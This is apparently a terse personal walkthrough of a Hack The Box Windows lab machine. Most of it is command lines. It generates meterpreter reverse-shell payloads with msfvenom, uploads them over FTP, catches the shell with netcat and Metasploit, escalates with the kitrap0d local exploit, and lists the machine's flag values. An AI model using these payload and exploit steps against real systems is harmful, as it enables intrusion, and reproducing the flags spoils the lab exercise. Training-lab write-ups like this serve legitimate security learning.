## 31072023Mon

**Windows** *Easy*

https://app.hackthebox.com/machines/3

![[Pasted image 20230731183816.png]]

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f asp > exploit.asp
```

![[Pasted image 20230731184047.png]]

```
ftp 10.129.164.33
```

![[Pasted image 20230731184218.png]]

```
http://10.129.164.33/exploit.asp
```

![[Pasted image 20230731184341.png]]

```
nc -lvp 4444
```

![[Pasted image 20230731184420.png]]

```
http://10.129.164.33/welcome.png
```
![[Pasted image 20230731184519.png]]

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f aspx > exploit.aspx
```
![[Pasted image 20230731185236.png]]
```
http://10.129.164.33/exploit.aspx
```
![[Pasted image 20230731185344.png]]
![[Pasted image 20230731185402.png]]
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
![[Pasted image 20230731185816.png]]
![[Pasted image 20230731190028.png]]
```
cd %TEMP%
```
```
use exploit/windows/local/ms10_015_kitrap0d
```
![[Pasted image 20230731191113.png]]
![[Pasted image 20230731191512.png]]
![[Pasted image 20230731191702.png]]

![[Pasted image 20230731192143.png]]

```
cat C:\\Users\\babis\\Desktop\\user.txt
```
*user.txt*
```
6179b357c668a80285f0dc909e5f63e3
```

```
cat C:\\Users\\Administrator\\\Desktop\\root.txt
```
*root.txt*
```
bbdd9af9835d374e24f1f5c9c6396c4d
```

![[Pasted image 20230731192803.png]]

![[Pasted image 20230731192421.png]]
![[Pasted image 20230731193006.png]]

### 29-Jan-24-Mon

*Guided Mode answered*
